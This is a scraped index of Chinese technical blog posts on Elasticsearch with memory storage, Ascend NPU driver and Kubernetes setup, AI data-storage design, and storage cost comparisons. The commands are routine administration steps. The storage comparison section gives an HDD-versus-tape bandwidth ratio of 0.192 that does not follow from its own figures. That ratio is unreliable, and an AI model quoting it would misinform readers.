beat.k8s.elastic.co/v1beta1 kind: Beat metadata: name: es-jfs-prod namespace: $NAMESPACE spec: type: metricbeat version: 8.12.0 elasticsearchRef: name: es-jfs-prod config: metricbeat: autodiscover: providers: - type: kubernetes scope: cluster hints.enabled: true templates: - config: - module: kubernetes metricsets: - event period: 10s processors: - add_cloud_metadata: {} logging.json: true deployment: podTemplate: spec: serviceAccountName: metricbeat automountServiceAccountToken: true securityContext: runAsUser: 0 containers: - name: metricbeat resources: requests: cpu: 1 memory: 1Gi limits: cpu: 4 memory: 4Gi EOF 部署 Kibana 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: kibana.k8s.elastic.co/v1 kind: Kibana metadata: namespace: $NAMESPACE name: es-jfs-prod spec: version: 8.12.0 count: 1 image: hubimage/kibana:8.12.0 elasticsearchRef: name: es-jfs-prod http: tls: selfSignedCertificate: disabled: true EOF 查看 Elasticsearch 集群信息 配置 S3 存储 主要用来备份和恢复索引\n1 2 3 4 5 6 7 8 9 10 PUT /_snapshot/ks3 { \u0026#34;type\u0026#34;: \u0026#34;s3\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;bucket\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;base_path\u0026#34;: \u0026#34;datalake/prod/elastic-snapshot\u0026#34;, \u0026#34;region\u0026#34;: \u0026#34;BEIJING\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;ks3-cn-beijing-internal.ksyuncs.com\u0026#34; } } 4. 导入数据 创建索引 在 Elasticsearch Management 的 Dev Tools 页面中执行:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PUT /bayou_tt_articles { \u0026#34;settings\u0026#34;: { \u0026#34;index\u0026#34;: { \u0026#34;number_of_shards\u0026#34;: 30, \u0026#34;number_of_replicas\u0026#34;: 1, \u0026#34;refresh_interval\u0026#34;: \u0026#34;120s\u0026#34;, \u0026#34;translog.durability\u0026#34;: \u0026#34;async\u0026#34;, \u0026#34;translog.sync_interval\u0026#34;: \u0026#34;120s\u0026#34;, \u0026#34;translog.flush_threshold_size\u0026#34;: \u0026#34;2048M\u0026#34; } }, \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;text\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; } } } } 有两个注意事项:\n保持每个分片大小在 10-50G 之间，这里 number_of_shards 设置为 30，因为一共有几百 GB 的数据需要导入。 副本数至少为 1，是为了保障 Pod 在滚动更新时不会丢失数据。当 Pod 的 IP 发生变化时，Elasticsearch 会认为是一个新的节点，不能复用之前的数据，此时如果没有副本重建分片，会导致数据丢失。 安装导入工具 也可以采用 elasticdump 容器导入，下面也会有示例。这里采用 npm 安装。\n1 apt-get install npm -y 1 npm install elasticdump -g 导入数据 1 2 export DATAPATH=./bayou_tt_articles_0.jsonl nohup elasticdump --limit 20000 --input=${DATAPATH} --output=http://elastic:xxx@x.x.x.x:31391/ --output-index=bayou_tt_articles --type=data --transform=\u0026#34;doc._source=Object.assign({},doc)\u0026#34; \u0026gt; elasticdump-${DATAPATH}.log 2\u0026gt;\u0026amp;1 \u0026amp; limit 表示每次导入的数据条数，默认值是 100 太小，建议在保障导入成功的前提下尽可能大一点。\n查看索引速率 索引速率达到 1w+/s，但上限远不止于此。因为，根据社区文档的压力测试结果显示，单个节点至少能提供 2W/s 的索引速率。\n5. 测试与验证 全文检索性能显著提升 上图是使用 JuiceFS 存储的全文检索速度为 18s，使用 SSD 节点的 Elasticsearch 的全文检索速度为 5s。下图是使用内存存储的 Elasticsearch 的全文检索速度为 100ms 左右。\n更新 Elasticsearch 不会丢数据 之前给 Elasticsearch Pod 分配的 CPU 和 Memory 太多，调整为 CPU 32C，Memory 64 GB。在滚动更新过程中，Elasticsearch 始终可用，并且数据没有丢失。\n但务必注意设置 replicas \u0026gt; 1，尽量不要自行重启 Pod，虽然 Pod 是原节点更新。\n能平稳实现节点的扩容 由于业务总的 Elasticsearch 存储需求是 10T 左右，我继续增加节点到 10 个，Elasticsearch 的索引分片会自动迁移，均匀分布在这些节点上。\n导出索引速度达 1w 条每秒 1 docker run --rm -ti elasticdump/elasticsearch-dump --limit 10000 --input=http://elastic:xxx@x.x.x.x:31391/bayou_tt_articles --output=/data/es-bayou_tt_articles-output.json --type=data 1 2 3 4 5 6 7 Wed, 29 May 2024 01:41:23 GMT | got 10000 objects from source elasticsearch (offset: 0) Wed, 29 May 2024 01:41:23 GMT | sent 10000 objects to destination file, wrote 10000 Wed, 29 May 2024 01:41:24 GMT | got 10000 objects from source elasticsearch (offset: 10000) Wed, 29 May 2024 01:41:24 GMT | sent 10000 objects to destination file, wrote 10000 Wed, 29 May 2024 01:41:25 GMT | got 10000 objects from source elasticsearch (offset: 20000) Wed, 29 May 2024 01:41:25 GMT | sent 10000 objects to destination file, wrote 10000 Wed, 29 May 2024 01:41:25 GMT | got 10000 objects from source elasticsearch (offset: 30000) 导出速度能达到 1w 条每秒，一亿条数据大约需要 3h，基本也能满足索引的备份、迁移需求。\nElasticsearch 节点 Pod 更新时，不会发生漂移 更新之前的 Pod 分布节点如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES es-jfs-prod-beat-metricbeat-7fbdd657c4-djgg6 1/1 Running 6 (32m ago) 18h 10.244.54.5 ascend-01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-0 1/1 Running 0 28m 10.244.46.82 ascend-07 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-1 1/1 Running 0 29m 10.244.23.77 ascend-53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-2 1/1 Running 0 31m 10.244.49.65 ascend-20 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-3 1/1 Running 0 32m 10.244.54.14 ascend-01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-4 1/1 Running 0 34m 10.244.100.239 ascend-40 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-5 1/1 Running 0 35m 10.244.97.201 ascend-39 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-6 1/1 Running 0 37m 10.244.101.156 ascend-38 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-7 1/1 Running 0 39m 10.244.19.101 ascend-49 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-8 1/1 Running 0 40m 10.244.16.109 ascend-46 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-9 1/1 Running 0 41m 10.244.39.119 ascend-15 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-kb-75f7bbd96-6tcrn 1/1 Running 0 18h 10.244.1.164 ascend-22 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 更新之后的 Pod 分布节点如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES es-jfs-prod-beat-metricbeat-7fbdd657c4-djgg6 1/1 Running 6 (50m ago) 18h 10.244.54.5 ascend-01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-0 1/1 Running 0 72s 10.244.46.83 ascend-07 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-1 1/1 Running 0 2m35s 10.244.23.78 ascend-53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-2 1/1 Running 0 3m59s 10.244.49.66 ascend-20 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-3 1/1 Running 0 5m34s 10.244.54.15 ascend-01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-4 1/1 Running 0 7m21s 10.244.100.240 ascend-40 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-5 1/1 Running 0 8m44s 10.244.97.202 ascend-39 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-6 1/1 Running 0 10m 10.244.101.157 ascend-38 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-7 1/1 Running 0 11m 10.244.19.102 ascend-49 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-8 1/1 Running 0 13m 10.244.16.110 ascend-46 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-es-default-9 1/1 Running 0 14m 10.244.39.120 ascend-15 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; es-jfs-prod-kb-75f7bbd96-6tcrn 1/1 Running 0 18h 10.244.1.164 ascend-22 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 这点打消了我的一个顾虑， Elasticsearch 的 Pod 重启时，发生了漂移，那么节点上是否会残留分片的数据，导致内存使用不断膨胀？答案是，不会。ECK Operator 似乎能让 Pod 在原节点进行重启，挂载的 Hostpath 数据依然对新的 Pod 有效，仅当主机节点发生重启时，才会丢失数据。\n6. 总结 AI 的算力节点有大量空闲的 CPU 和 Memory 资源，使用这些大内存的主机节点，部署一些短生命周期的基于内存存储的高性能应用，有利于提高资源的使用效率。\n本篇主要介绍了借助于 Hostpath 的内存存储部署 Elasticsearch 提供高性能查询能力的方案，具体内容如下：\n将内存 mount 目录到主机上 创建基于 Hostpath 的 PVC，将数据挂载到上述目录 使用 ECK Operator 部署 Elasticsearch Elasticsearch 更新时，数据并不会丢失，但不能同时重启多个主机节点 300+GB、一亿+条数据，全文检索响应场景中，基于 JuiceFS 存储的速度为 18s， SSD 节点的速度为 5s，内存节点的速度为 100ms ","description":"","id":46,"section":"post","tags":["博文","Elasticsearch","高性能","全文检索"],"title":"部署基于内存存储的 Elasticsearch - 一亿+条数据，全文检索 100ms 响应","uri":"https://www.chenshaowen.com/blog/deploy-elasticsearch-using-memory-storage.html"},{"content":"1. 安装驱动 创建 HwHiAiUser 用户 1 2 groupadd -g 1000 HwHiAiUser useradd -g HwHiAiUser -u 1000 -d /home/HwHiAiUser -m HwHiAiUser -s /bin/bash 添加目录权限 1 2 chown -R HwHiAiUser /usr/local/Ascend chmod -R 755 /usr/local/Ascend 下载驱动、固件 前往 https://www.hiascend.ru/hardware/firmware-drivers/community?product=1\u0026amp;model=30\u0026amp;cann=All\u0026amp;driver=1.0.26.alpha 找到对应的驱动和固件。\n1 wget https://ascend-repo.obs.cn-east-2.myhuaweicloud.com/Ascend%20HDK/Ascend%20HDK%2024.1.RC2.2/Ascend-hdk-910b-npu-driver_24.1.rc2.2_linux-x86-64.run 1 wget https://ascend-repo.obs.cn-east-2.myhuaweicloud.com/Ascend%20HDK/Ascend%20HDK%2024.1.RC2.2/Ascend-hdk-910b-npu-firmware_7.3.0.2.220.run 安装驱动 1 bash ./Ascend-hdk-910b-npu-driver_24.1.rc2.2_linux-x86-64.run --full --install-for-all 安装固件 1 bash ./Ascend-hdk-910b-npu-firmware_7.3.0.2.220.run --full 2. 安装 ascend-docker-runtime 下载 ascend-docker-runtime 前往 https://gitee.com/ascend/ascend-docker-runtime/releases/tag/v5.0.0-RC3.2 找到对应架构的下载链接。\n1 wget https://gitee.com/ascend/ascend-docker-runtime/releases/download/v5.0.0-RC3.2/Ascend-docker-runtime_5.0.RC3.2_linux-x86_64.run 安装 ascend-docker-runtime 1 bash ./Ascend-docker-runtime_5.0.RC3.2_linux-x86_64.run --install 3. 安装 Docker [可选] Docker 和 Containerd 二选一。\n3.1 安装 docker 添加 key 1 2 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - \u0026amp;\u0026amp; curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 添加源 1 2 3 4 cat \u0026gt;\u0026gt; /etc/apt/sources.list.d/docker.list \u0026lt;\u0026lt; EOF deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu xenial stable deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable EOF 更新源 1 apt-get update 安装 docker 1 apt-get install docker-ce=5:20.10.7~3-0~ubuntu-xenial docker-ce-cli=5:20.10.7~3-0~ubuntu-xenial containerd.io -y 3.2 配置 docker 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/docker/daemon.json { \u0026#34;bip\u0026#34;: \u0026#34;x.x.x.x/24\u0026#34;, \u0026#34;live-restore\u0026#34;: true, \u0026#34;data-root\u0026#34;: \u0026#34;/data/docker\u0026#34;, \u0026#34;default-runtime\u0026#34;: \u0026#34;ascend\u0026#34;, \u0026#34;insecure-registries\u0026#34;: [ ], \u0026#34;registry-mirrors\u0026#34;: [ ], \u0026#34;runtimes\u0026#34;: { \u0026#34;ascend\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/local/Ascend/Ascend-Docker-Runtime/ascend-docker-runtime\u0026#34;, \u0026#34;runtimeArgs\u0026#34;: [] } } } EOF 重启 docker 1 2 systemctl daemon-reload systemctl restart docker 3.3 安装 cri-docker 用于 Kubelet 调用，如果使用的是 containerd，可以跳过这一步。\n安装 CRI-Docker 1 2 3 4 wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.10/cri-dockerd-0.3.10.amd64.tgz tar -zxvf cri-dockerd-0.3.10.amd64.tgz cp cri-dockerd/cri-dockerd /usr/local/bin/cri-dockerd chmod +x /usr/local/bin/cri-dockerd 添加用户组 1 groupadd docker 配置启动文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/systemd/system/cri-docker.service [Unit] Description=CRI Interface for Docker Application Container Engine Documentation=https://docs.mirantis.com After=network-online.target firewalld.service docker.service Wants=network-online.target Requires=cri-docker.socket [Service] Type=notify ExecStart=/usr/local/bin/cri-dockerd --network-plugin=cni --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.9 ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always StartLimitBurst=3 StartLimitInterval=60s LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity TasksMax=infinity Delegate=yes KillMode=process [Install] WantedBy=multi-user.target EOF 生成 socket 文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/systemd/system/cri-docker.socket [Unit] Description=CRI Docker Socket for the API PartOf=cri-docker.service [Socket] ListenStream=%t/cri-dockerd.sock SocketMode=0660 SocketUser=root SocketGroup=docker [Install] WantedBy=sockets.target EOF 启动 CRI-DOCKER 1 2 3 4 systemctl daemon-reload systemctl start cri-docker systemctl enable cri-docker systemctl is-active cri-docker 3.4 验证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 docker run --rm -it --ipc=host \\ --device=/dev/davinci0 \\ --device=/dev/davinci1 \\ --device=/dev/davinci2 \\ --device=/dev/davinci3 \\ --device=/dev/davinci_manager \\ --device=/dev/devmm_svm \\ --device=/dev/hisi_hdc \\ -v /usr/local/Ascend/driver:/usr/local/Ascend/driver \\ -v /usr/local/Ascend/add-ons/:/usr/local/Ascend/add-ons/ \\ -v /usr/local/sbin/:/usr/local/sbin/ \\ -v /usr/local/sbin/npu-smi:/usr/local/sbin/npu-smi \\ -v /var/log/npu/conf/slog/slog.conf:/var/log/npu/conf/slog/slog.conf \\ -v /var/log/npu/slog/:/var/log/npu/slog \\ -v /var/log/npu/profiling/:/var/log/npu/profiling \\ -v /var/log/npu/dump/:/var/log/npu/dump \\ -v /var/log/npu/:/usr/slog \\ registry.cn-beijing.aliyuncs.com/opshub/hccl-test:8.0.RC2-ubuntu22.04 \\ npu-smi info 4. 安装 Containerd [可选] Docker 和 Containerd 二选一。\n4.1 安装 containerd 添加源 1 2 apt-get update apt-get install -y ca-certificates curl gnupg lsb-release 1 2 mkdir -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 1 2 3 echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\u0026#34; | sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null 安装 containerd 1 2 apt update apt install containerd.io=1.6.31-1 4.2 配置 containerd 生成 containerd 配置文件 toml 1 2 mkdir -p /etc/containerd containerd config default \u0026gt; /etc/containerd/config.toml 修改 containerd 配置文件 1 2 3 4 sed -i \u0026#39;s#root = \u0026#34;/var/lib/containerd\u0026#34;#root = \u0026#34;/data/containerd\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#state = \u0026#34;/run/containerd\u0026#34;#state = \u0026#34;/data/run/containerd\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#sandbox_image = \u0026#34;registry.k8s.io/pause:3.6\u0026#34;#sandbox_image = \u0026#34;registry.aliyuncs.com/google_containers/pause:3.9\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#SystemdCgroup = false#SystemdCgroup = true#g\u0026#39; /etc/containerd/config.toml 修改 runtime 为 ascend 1 sed -i \u0026#39;s#runtime = \u0026#34;runc\u0026#34;#runtime = \u0026#34;/usr/local/Ascend/Ascend-Docker-Runtime/ascend-docker-runtime\u0026#34;#g\u0026#39; /etc/containerd/config.toml 重启 containerd 1 systemctl restart containerd 4.3 验证 安装 nerdctl 工具 1 opscli task -f ~/.ops/tasks/install-nerdctl.yaml 验证 ARM 镜像\n1 export TEST_IMAGE=registry.cn-beijing.aliyuncs.com/opshub/python38-cann:8.0rc3-arm64 AMD64 镜像\n1 export TEST_IMAGE=registry.cn-beijing.aliyuncs.com/opshub/python38-cann:8.0rc2-amd64 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nerdctl -n k8s.io run --rm -it --ipc=host \\ --device=/dev/davinci0 \\ --device=/dev/davinci1 \\ --device=/dev/davinci2 \\ --device=/dev/davinci3 \\ --device=/dev/davinci_manager \\ --device=/dev/devmm_svm \\ --device=/dev/hisi_hdc \\ -v /usr/local/Ascend/driver:/usr/local/Ascend/driver \\ -v /usr/local/Ascend/add-ons/:/usr/local/Ascend/add-ons/ \\ -v /usr/local/sbin/:/usr/local/sbin/ \\ -v /usr/local/sbin/npu-smi:/usr/local/sbin/npu-smi \\ -v /var/log/npu/conf/slog/slog.conf:/var/log/npu/conf/slog/slog.conf \\ -v /var/log/npu/slog/:/var/log/npu/slog \\ -v /var/log/npu/profiling/:/var/log/npu/profiling \\ -v /var/log/npu/dump/:/var/log/npu/dump \\ -v /var/log/npu/:/usr/slog \\ ${TEST_IMAGE} \\ npu-smi info 4. 加入 K8s 集群 4.1 修改 Hostname 1 2 export HOSTNAME=k8s-ascend-910b-27 hostnamectl set-hostname ${HOSTNAME} 创建设备管理插件的工作目录\n1 mkdir -p /var/log/mindx-dl/devicePlugin 4.2 初始化内核参数 1 opscli task -f ~/.ops/task/set-host.yaml 4.3 安装 K8s 基础组件 添加 K8s 源 https://developer.aliyun.com/mirror/kubernetes/ 1.28 以下版本添加\n1 curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - 1 2 3 cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apt/sources.list.d/kubernetes.list deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main EOF 1 apt-get update 安装 K8s 基础组件 1 export K8S_VERSION=1.25.6 1 apt-get install kubeadm=${K8S_VERSION}-00 kubelet=${K8S_VERSION}-00 kubectl=${K8S_VERSION}-00 -y 4.4 加入集群 生成 Token 在 master 节点生成 token\n1 kubeadm token create --print-join-command 加入集群 如果 worker 节点是 Docker Runtime，在加入集群时，需要加上参数 --cri-socket unix:///var/run/cri-dockerd.sock 。\n1 kubeadm join x.x.x.x:6443 --token x.x --discovery-token-ca-cert-hash sha256:x --cri-socket unix:///var/run/cri-dockerd.sock 4.5 创建测试的 Pod 创建 Pod 1 export TEST_IMAGE=registry.cn-beijing.aliyuncs.com/opshub/python38-cann:8.0rc3-arm64 AMD64 镜像\n1 export TEST_IMAGE=registry.cn-beijing.aliyuncs.com/opshub/python38-cann:8.0rc2-amd64 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: npu-demo spec: nodeName: ${HOSTNAME} containers: - name: npu-demo image: ${TEST_IMAGE} command: [\u0026#34;npu-smi\u0026#34;, \u0026#34;info\u0026#34;] resources: requests: huawei.com/Ascend910: 4 limits: huawei.com/Ascend910: 4 EOF 查看 Pod 状态 1 kubectl logs npu-demo 删除 Pod 1 kubectl delete pod npu-demo 5. NPU 状态检测 禁用 TLS 1 for i in {0..15};do hccn_tool -i $i -tls -g| grep \u0026#39;switch\u0026#39;;done IP 1 for i in {0..15};do hccn_tool -i $i -ip -g;done 网关 1 for i in {0..15};do hccn_tool -i $i -gateway -g;done 健康状态 1 for i in {0..15};do npu-smi info -t health -i $i -c 0| grep \u0026#39;Health Status\u0026#39;;done link 状态 1 for i in {0..15}; do hccn_tool -i $i -link -g;done 网卡状态 1 for i in {0..15};do hccn_tool -i $i -net_health -g;done ECC 1 for i in {0..15}; do npu-smi info -t ecc -i $i;done 6. 参考 https://ascend.github.io/docs/sources/ascend/quick_install.html ","description":"","id":47,"section":"post","tags":["博文","AI","NPU","Ascend","硬件","驱动"],"title":"Ascend NPU 驱动安装","uri":"https://www.chenshaowen.com/blog/ascend-npu-driver-installation.html"},{"content":"1. 基于对象存储的数据交付 如上图，在模型研发过程中，主要涉及三个子平台，分别是:\n数据平台 数据平台主要负责数据相关的管理，比如: 数据接入、数据处理，最终生成训练所需的数据。\n数据平台将原始数据存储到对象存储中，在处理时，从对象存储中获取数据，进行处理，完成之后存储到对象存储中。\n训练平台 训练平台主要负责模型的训练，比如: 提供模型的开发环境，支持模型的分布式训练。\n训练平台会给算法同学提供一个带有 AI 算力卡的 Jupyer 环境，以支持算法同学的线上开发和调试。他们将代码存储在实时性高的存储设备中，通过挂载的方式访问 checkpoint、模型等文件。\n启动大型分布式训练任务时，数据会被逐层预热直至 AI 算力卡的显存中，然后训练模型，最终得到模型。\n推理平台 推理平台主要负责模型的上线、流量的管理，比如: 模型的量化、模型的转换、模型的部署等。\n推理平台从对象存储中获取模型，开启工作流，部署模型并实现推理流量的治理。\n数据平台、训练平台、推理平台通常有不同的技术负责人，不能强求各平台使用统一的数据定义、使用的规范。\n因此这里强调的是数据交付，我们只需要定义好数据交付，至于各个平台内部如何实现，选择怎样的挂载方式、加速组件等，都由各个平台自己决定。\n从成本、性能、交付便捷性等方面考虑，基于对象存储的数据交付是一个非常好的选择。很多数据湖方案的底层也是基于对象存储。\n2. 数据平台 虽然 AI 加速卡擅长数据处理，但数据平台通常并不会使用这些昂贵的设备对数据进行处理。\nAI 任务主要占用的是 AI 算力卡资源。在我们线上的集群中，GPU、NPU 卡的显存使用率经常能达到 90%，但节点上的 CPU、Memory 资源使用率却只有 10% 左右。\n而加速计算节点又是高配的机器，它们的通常配备了几百 GB、甚至几个 TB 的 Memory，200 核心起步的 CPU 计算能力。这意味着，在加速计算节点上，我们还有大量的资源可用。\n数据平台的工作负载非常适合与 AI 任务进行混合部署。\n如上图，数据平台的存储主要分为两类:\n持久存储，比如录入的数据、训练需要的数据等 临时存储，比如处理数据过程中加速的数据、支撑数据集全文检索的 ES 存储卷等 3. 训练平台 如上图，在训练的过程中主要涉及三个存储交互:\n算法开发，存储算法同学的代码 代码是小文件，同时对实时性要求比较高，不适合存储在 JuiceFS 中，可以采用 NFS 存储，通过不同目录进行隔离区分个人和团队。\n训练数据，存储训练数据 训练数据的特征时，小文件特别多，对元数据的访问速度要求比较高，可以采用 JuiceFS 多区企业版。\n模型数据、Checkpoint 数据 存储 Checkpoint 时，训练任务处于暂停状态。Checkpoint 的存储速度会影响训练的效率。\n模型数据、Checkpoint 数据的暂存，也应该采用 JuiceFS，但可以降级为单区的企业版或者社区版。\n训练完成之后，我们应该设置一个归档任务，将训练过程中的模型、数据等数据存储到对象存储中。\nJuiceFS 应该作为一种临时存储，作为加速层，不应该长时间存储数据。\n4. 推理平台 我们通常在一个区域训练，但是需要在多个区域进行推理。\n进行多区推理的原因可能有:\n上层服务在多云部署，需要就近推理 单个云的 AI 算力卡资源不足 多云高可用 但这也带来了新的问题，模型怎样在多个云区域进行分发。\n如上图，模型的原始数据应该存储在对象存储上，通过公网或者专线进行模型的跨云分发。比如，从阿里云的 OSS 同步模型数据到腾讯云的 COS，公有云的对象存储同步速度比较快。\n在每个区域中，借助 JuiceFS 单区企业版或者社区版，将模型加载到 JuiceFS 通过 PVC 挂载到集群的推理 Pod 中，实现模型的推理。\n在同一个区域中的多个 Kubernetes 集群，可以共用一个 JuiceFS 存储。\n","description":"","id":48,"section":"post","tags":["博文","大模型","模型","JuiceFS","数据存储"],"title":"模型研发周期中的数据存储","uri":"https://www.chenshaowen.com/blog/data-storage-in-model-development-cycle.html"},{"content":"1. 存储的分层与互联 2. 各种存储类型 存储类型 带宽 容量 响应延时 单位存储成本 存储原理 适用场景 CPU L1 Cache 256-512GB/s 32-64KB/核心 \u0026lt;1ns 约$2000/MB SRAM CPU 核心最近层缓存 CPU L2 Cache 64-256GB/s 256KB-2MB/核心组 2-5ns 约$1000/MB 部分 SRAM,部分嵌入式 DRAM CPU 下一级缓存 CPU L3 Cache 32-128GB/s 4-16MB/CPU 5-15ns 约$100-200/MB 嵌入式 DRAM CPU 最后级缓存 GPU L1 Cache 8-32TB/s 16-96KB/SM \u0026lt;1ns 约$2000/MB SRAM GPU 核心最近层缓存 GPU L2 Cache 1-4TB/s 512KB-4MB/SMC 5-15ns 约$500-1000/MB 部分 SRAM,部分嵌入式 DRAM GPU 下一级缓存 主存(内存) 10-80GB/s 4-128GB 30-60ns 约$2-7/GB DDR4/5 DRAM 系统主存储空间 GPU 显存 768GB/s-4TB/s 4-24GB 25-75ns 约$7-20/GB GDDR6/6X SDRAM GPU 专用高速缓冲存储 SSD 500MB/s-7000MB/s 128GB-8TB 0.03-0.1ms 约$0.04-0.1/GB 闪存 NAND 高速固态存储 HDD 100-200MB/s 500GB-20TB 5-10ms 约$0.01-0.03/GB 磁盘 大容量便宜存储 磁带 60-360MB/s 1.5-30TB 20-180ms 约$0.002-0.01/GB 磁带 大容量低成本数据备份 3. 存储对比 代表值 存储类型 带宽 单位存储成本($/GB) 内存 20 GB/s 3 SSD 2 GB/s 0.08 HDD 150 MB/s 0.03 磁带 180 MB/s 0.005 好的，让我们来计算一下。\n带宽性价比计算 存储类型 带宽性价比 (GB/s per $/GB) 内存 20 / 3 = 6.67 SSD 2 / 0.08 = 25 HDD 0.15 / 0.03 = 5 磁带 0.18 / 0.005 = 36 带宽倍数关系 对比项 倍数 内存 vs SSD 10 倍 内存 vs HDD 133.33 倍 内存 vs 磁带 111.11 倍 SSD vs HDD 7.5 倍 SSD vs 磁带 1.44 倍 HDD vs 磁带 0.192 倍 单位成本倍数关系 对比项 倍数 内存 vs SSD 12.5 倍 内存 vs HDD 100 倍 内存 vs 磁带 600 倍 SSD vs HDD 8 倍 SSD vs 磁带 50 倍 HDD vs 磁带 6.25 倍 ","description":"","id":49,"section":"post","tags":["博文","存储","存储分层"],"title":"存储性能及成本对比","uri":"https://www.chenshaowen.com/blog/comparison-of-storage.html"},{"content":"1. 存储方案 三种存储方案：\n基于目录隔离公用一个 JuiceFS Elasticsearch 的节点共用一个 JuiceFS，通过子目录挂载不同的 Elasticsearch 节点。\n/0/ 对应节点 Node-0\n/1/ 对应节点 Node-1\n/2/ 对应节点 Node-2\n这种方式的好处主要是，易于扩展、配置方便。\n基于 JuiceFS 隔离节点数据 Elasticsearch 每个节点都对接一个独立的 JuiceFS，每个节点具有单独的存储后端。\nBucket-0 对应节点 Node-0\nBucket-1 对应节点 Node-1\nBucket-2 对应节点 Node-2\n这种方式的好处主要是，可靠性高、性能更好。\n结合 SSD 冷热数据分离 JuiceFS 的性能不及 SSD，采用混合的方式，将热数据放在 SSD 中，冷数据放在 JuiceFS 中，也是一个不错的选择。\n这种方式的好处主要是，兼顾成本与性能，但是运维更加复杂。\n目前的业务需求是，使用 Elasticsearch 查询一些温冷数据，但数据体量比较大，达到 10 TB 文本数据，能容忍接口响应时间 10 秒，因此采用的是基于目录隔离的方式。\n2. 创建 Elasticsearch 所需的 PVC 2.1. 设置环境变量 设置桶的信息 1 2 3 4 5 6 export ACCESS_KEY=xxx export SECRET_KEY=xxx export BUCKET=xxx export ENDPOINT=ks3-cn-beijing-internal.ksyun.com export BUCKET_ENPOINT=$BUCKET.$ENDPOINT export PROVIDER=ks3 设置 Redis 1 2 export REDIS_PASSWORD=xxx export REDIS_ENDPOINT=x.x.x.x:6379/0 设置 Elasticsearch 的 PVC 1 2 export NAMESPACE=xxx export PVC_NAME=elasticsearch-data-es-jfs-test-es-default-0 这里需要注意 PVC_NAME 是 ECK Operator 根据 Elasticsearch 的 name 生成的。这里创建的 Elasticsearch 名字为 es-jfs-test，所以 PVC_NAME 